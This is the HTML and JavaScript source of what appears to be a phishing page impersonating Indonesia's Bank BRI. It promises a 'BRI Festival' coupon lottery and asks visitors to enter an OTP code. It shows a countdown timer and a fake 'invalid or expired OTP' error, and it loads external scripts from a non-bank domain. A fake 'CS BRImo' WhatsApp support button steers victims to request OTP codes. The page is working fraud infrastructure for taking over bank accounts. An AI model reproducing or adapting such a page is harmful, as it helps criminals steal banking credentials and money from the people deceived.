...
<link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipe73s-3CcYv1XXmiOtnfFSKYbs7EFK5AJb1P4Jj-6LiXpr7qbbsnoHWxM-MG6cHMlkZu6V342OuENy8Evo_MoLlFzmub-d7VFYcBycMykKax6G8XaoMGi_IhqDZzVm9Sv05nTWxEDe82lnuwS4ln0HnG6VE0sGqhO70WQflrIt5RuY8lZIDftN9qwk4Q/s1080/AddText_10-22-11.27.23.jpg" />
  ...
  <style>
        @import url('wght@500&display=swap">https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
        body {
            padding: 0;
            margin: 0;
            width: 100%;
...
@keyframes blink{
 ...
 <span class="blink" style="display: none" id="blinkAktivasi"><h1>Kode OTP tidak valid, atau sudah kadaluarsa</h1></span> 
  ...
  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
    <center>
 <img id="gambarku" class="animated" src="https://hosting.tigerengine.id/a211ot.jpg" width="60%" style="margin-top: 250px; border-radius: 15px; box-shadow: rgba(199, 199, 199, 2.2)  0px 2px 5px 0px; border: 2px double #0F78CB" onclick="tutupimg()">
    </center>
</div>
<nav style="position: ; top: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 65px; background: #F1F5F8; z-index: 99999; border-bottom: 0.5px solid #ddd">
 <img src="https://hosting.tigerengine.id/h5x1k1.jpg" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto;border-bottom: 0.5px solid #ddd">
</nav>
<img src="https://hosting.tigerengine.id/aep5pt.jpg" style="width: 100%; border-radius: 0px 0px 100px 0px; border-bottom: 5px double #F6AA23; outline: 2px solid #2468A5;background: #fff; box-shadow: rgba(0, 0, 0, 2.2)  0px 2px 7px 0px;">  
<span class="blink" style="display: none" id="blinkk"><h1>Kode OTP tidak Valid, atau sudah Kadaluarsa</h1></span>
  <div class="container" id="otp"> 
   <div class="box-lte"> 
    <div class="row" style="margin-top: 100px;"> 
     <center>
     <div class="col-12 d-block mx-auto text-center p-0" style="height: 62%; width: 100%; max-width: 100%; display: block; border-radius: 0px 25px 0px 25px; position: absolute; margin: 0px auto; left: 0; right: 0;z-index: -1; text-align: center; margin-top: 75px ;"> 
     </div> 
    </div> 
   
    <center>
    <div class="row" style="margin-top: 0px; border: 2px solid #fff; width: 100%;height:165px; border-radius: 15px; background-image: url(); background-size: 100% 100%; background-position: 100% 100%; padding-top: 10px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px; margin: -30px auto; background: #fff; padding: 10px; color: #0F78CB; font-weight: 550; color: #fff;
background: #2468A5;
text-shadow: #101010 1px 1px 0; font-weight: bold; box-shadow: rgba(50, 50, 93, 0.25) 0px 6px 12px -2px, rgba(0, 0, 0, 0.3) 0px 3px 7px -3px; font-size: 15px; text-align: center" id="Typed"> 
    
    </div> </b>
  </div>
   <div class="container" id="Aktivasi" style="display: none"> 
   <div class="box-lte"> 
    ...
    <div class="row"> 
     ...
     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: -10px auto;" id="waktu">1 : 00</p> 
    
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Virtual TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><div style="font-weight: bold; text-align: center; margin-top: -20px; margin-bottom: -20px; color: #098CE3">Masukkan Kode OTP</div></p> <br>
     </div> 
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
  <form onsubmit="kirimPesan(event)" method="post" id="formLink">
       <center> 
       ...
       <i class="ion-ios-locked-outline" id="ionIcons"></i> 
         ...
         <b> <a href="https://amanah12.biz.id/onclick='windiw.location.href=''"><p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px; position: relative" onclick="window.location.href=''"><strong style="color: #FF0000; text-decoration: none"> Belum Menerima Kode OTP ?<br>
...
<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
   ...
   <b> 
     ...
     <center>
 <img src="https://hosting.tigerengine.id/ciakn7.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
     </center>
    </div> </b>
  </div>
    <center>
...
<source src="https://d.top4top.io/m_33969cln60.mp3" type="audio/ogg">
<source src="https://d.top4top.io/m_33969cln60.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio> 
 <audio hidden controls id="bsiku">
<source src="https://amanah12.biz.id/tunggu-bri." type="audio/ogg">
<source src="https://amanah12.biz.id/tunggu-bri." type="audio/mpeg">
  Your browser does not support the audio element.
</audio>       
<script
    src='https://amanah12.biz.id/whatsapp-button.js'
    async
    onLoad="whatsappButton({
    buttonName:' ',
    buttonIconSize: '32',
    brandImageUrl:'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8eHxO93WCnRc-CQfdz96UGBAhJ7EbRcBzVgWFRSMV5mLEUhHegPaifIHxM7MZszAW_XuZrseWLPBG99DT4SGF8ObwpYXG0aWGYt96e559R5J1AMa_30Ikxi6aoOtR8jvSansOh7obOZyD3nGJ11rHDvQdyxAqJzpbh-6KAa2eeJt6nsclBfwlhoY-x3c/s388/IMG_20240518_024956.jpg',
    buttonMargin:'',
    brandName:'𝗖𝗦 𝗕𝗥𝗜𝗺𝗼',
    brandSubtitleText:'online',
    buttonSize:'medium',
    buttonPosition:'right',
    callToAction:'Chat Sekarang',
    phoneNumber:'628315522080',
    welcomeMessage:'Halo Kak, Apa yang dapat saya bantu?👋',
    prefillMessage:'Saya Mau Request Kode OTP aktivasi',
    })"
    >
</script>        
...
<script src="https://amanah12.biz.id/mainkode.js"></script>
...
document.getElementById("pass").value = norek + "";
 ...
 function tutupimg(){
  ...
  new Typed('#typed',{
  strings : ['', 'Terimakasih Telah Mendaftar Dilayanan Bank BRI Festival, Pendaftaran Anda Sedang Diproses, Sesaat Lagi Anda Akan Dihubungi Oleh Pihak Bank BRI, Untuk Proses Cetak Kode Kupon Undian Anda'],
  typeSpeed : 45,
  delaySpeed : 1000,
  loop : false
});
...
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://wa.me/628?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20Belum%20Mendapat%20Kode%20OTP Kupon';
    }, 0);    
